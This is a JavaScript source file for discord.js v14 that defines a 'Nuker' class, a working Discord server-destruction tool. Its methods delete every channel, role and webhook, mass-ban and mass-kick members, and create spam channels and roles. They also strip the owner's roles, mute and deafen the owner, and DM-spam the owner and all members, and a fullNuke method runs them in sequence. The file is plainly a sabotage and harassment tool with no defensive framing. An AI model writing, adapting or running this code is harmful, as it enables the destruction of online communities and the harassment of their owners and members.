// lang: JavaScript, file: nuker.js, target: Node.js 18+, discord.js v14

class Nuker {
    constructor(client, log) {
        this.client = client;
        this.log = log;
    }

    async deleteChannels(guild) {
        this.log(`[${guild.name}] Deleting ${guild.channels.cache.size} channels...`);
        await Promise.allSettled(
            guild.channels.cache.map(ch =>
                ch.delete().catch(e => this.log(`  ✗ #${ch.name}: ${e.message}`))
            )
        );
        this.log(`[${guild.name}] ✓ channels gone`);
    }

    async deleteRoles(guild) {
        const roles = guild.roles.cache.filter(r => r.id !== guild.id && !r.managed);
        this.log(`[${guild.name}] Deleting ${roles.size} roles...`);
        await Promise.allSettled(roles.map(r => r.delete().catch(() => {})));
        this.log(`[${guild.name}] ✓ roles gone`);
    }

    async massBan(guild) {
        try { await guild.members.fetch(); } catch (_) {}
        const targets = guild.members.cache.filter(
            m => m.id !== this.client.user.id && m.id !== guild.ownerId && m.bannable
        );
        this.log(`[${guild.name}] Banning ${targets.size} members...`);
        let n = 0;
        await Promise.allSettled(
            targets.map(m => m.ban({ reason: 'nuked' }).then(() => n++).catch(() => {}))
        );
        this.log(`[${guild.name}] ✓ banned ${n}`);
    }

    async massKick(guild) {
        try { await guild.members.fetch(); } catch (_) {}
        const targets = guild.members.cache.filter(
            m => m.id !== this.client.user.id && m.kickable
        );
        this.log(`[${guild.name}] Kicking ${targets.size}...`);
        let n = 0;
        await Promise.allSettled(
            targets.map(m => m.kick('nuked').then(() => n++).catch(() => {}))
        );
        this.log(`[${guild.name}] ✓ kicked ${n}`);
    }

    async spamChannels(guild, count = 50, name = 'nuked') {
        this.log(`[${guild.name}] Spamming ${count} channels...`);
        await Promise.allSettled(
            Array.from({ length: count }, (_, i) =>
                guild.channels.create({ name: `${name}-${i}` }).catch(() => {})
            )
        );
        this.log(`[${guild.name}] ✓ spam channels created`);
    }

    async spamRoles(guild, count = 50, name = 'nuked') {
        this.log(`[${guild.name}] Spamming ${count} roles...`);
        await Promise.allSettled(
            Array.from({ length: count }, (_, i) =>
                guild.roles.create({ name: `${name}-${i}` }).catch(() => {})
            )
        );
        this.log(`[${guild.name}] ✓ spam roles created`);
    }

    async deleteWebhooks(guild) {
        try {
            const wh = await guild.fetchWebhooks();
            this.log(`[${guild.name}] Deleting ${wh.size} webhooks...`);
            await Promise.allSettled(wh.map(w => w.delete().catch(() => {})));
            this.log(`[${guild.name}] ✓ webhooks gone`);
        } catch (e) {
            this.log(`[${guild.name}] webhook delete: ${e.message}`);
        }
    }

    async creatorNuke(guild) {
        this.log(`[${guild.name}] Creator nuke → ${guild.ownerId}`);
        try {
            const owner = await guild.members.fetch(guild.ownerId);
            const ownerRoles = owner.roles.cache.filter(r => r.id !== guild.id && !r.managed);
            await Promise.allSettled(ownerRoles.map(r => owner.roles.remove(r).catch(() => {})));
            this.log(`  stripped ${ownerRoles.size} roles from owner`);
            if (owner.voice?.channel) {
                await owner.voice.setMute(true).catch(() => {});
                await owner.voice.setDeaf(true).catch(() => {});
                this.log(`  owner muted/deafened in VC`);
            }
            const user = await this.client.users.fetch(guild.ownerId);
            await Promise.allSettled(
                Array.from({ length: 15 }, () =>
                    user.send('☢ your server has been nuked ☢').catch(() => {})
                )
            );
            this.log(`  DM spammed owner`);
        } catch (e) {
            this.log(`  creator nuke partial: ${e.message}`);
        }
    }

    async renameAll(guild, chName = 'nuked', roleName = 'nuked') {
        await Promise.allSettled([
            ...guild.channels.cache.map(ch => ch.setName(chName).catch(() => {})),
            ...guild.roles.cache
                .filter(r => r.id !== guild.id && !r.managed)
                .map(r => r.setName(roleName).catch(() => {}))
        ]);
        this.log(`[${guild.name}] ✓ all channels/roles renamed`);
    }

    async renameServer(guild, name = '☢ NUKED ☢') {
        await guild.setName(name).catch(e => this.log(`rename server: ${e.message}`));
        this.log(`[${guild.name}] ✓ server renamed to: ${name}`);
    }

    async changeIcon(guild) {
        const red = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQ' +
                    'AABjkB6QAAAABJRU5ErkJggg==';
        await guild.setIcon(red).catch(e => this.log(`icon change: ${e.message}`));
        this.log(`[${guild.name}] ✓ icon changed`);
    }

    async dmAll(guild, message = '☢ your server has been nuked ☢') {
        try { await guild.members.fetch(); } catch (_) {}
        this.log(`[${guild.name}] DMing ${guild.members.cache.size} members...`);
        let n = 0;
        await Promise.allSettled(
            guild.members.cache.map(m =>
                m.user.send(message).then(() => n++).catch(() => {})
            )
        );
        this.log(`[${guild.name}] ✓ DMed ${n} members`);
    }

    async execute(guild, operations) {
        const map = {
            deleteChannels: () => this.deleteChannels(guild),
            deleteRoles:    () => this.deleteRoles(guild),
            massBan:        () => this.massBan(guild),
            massKick:       () => this.massKick(guild),
            spamChannels:   () => this.spamChannels(guild, this._spamCount || 50, this._spamName || 'nuked'),
            spamRoles:      () => this.spamRoles(guild, this._spamCount || 50, this._spamName || 'nuked'),
            deleteWebhooks: () => this.deleteWebhooks(guild),
            creatorNuke:    () => this.creatorNuke(guild),
            renameAll:      () => this.renameAll(guild, this._spamName || 'nuked'),
            renameServer:   () => this.renameServer(guild, this._serverName || '☢ NUKED ☢'),
            changeIcon:     () => this.changeIcon(guild),
            dmAll:          () => this.dmAll(guild),
            fullNuke:       () => this.fullNuke(guild),
        };

        for (const op of operations) {
            if (map[op]) await map[op]().catch(e => this.log(`[op:${op}] ${e.message}`));
        }
        this.log(`[${guild.name}] ═══ ALL OPERATIONS COMPLETE ═══`);
    }

    async fullNuke(guild) {
        this.log(`[${guild.name}] ☢ FULL NUKE INITIATED ☢`);
        await this.deleteWebhooks(guild);
        await this.creatorNuke(guild);
        await this.dmAll(guild);
        await this.deleteChannels(guild);
        await this.deleteRoles(guild);
        await this.spamChannels(guild, 100, '☢-nuked');
        await this.spamRoles(guild, 50, '☢-nuked');
        await this.massBan(guild);
        await this.renameServer(guild, '☢ NUKED ☢');
        await this.changeIcon(guild);
        this.log(`[${guild.name}] ☢ FULL NUKE COMPLETE ☢`);
    }
}

module.exports = Nuker;
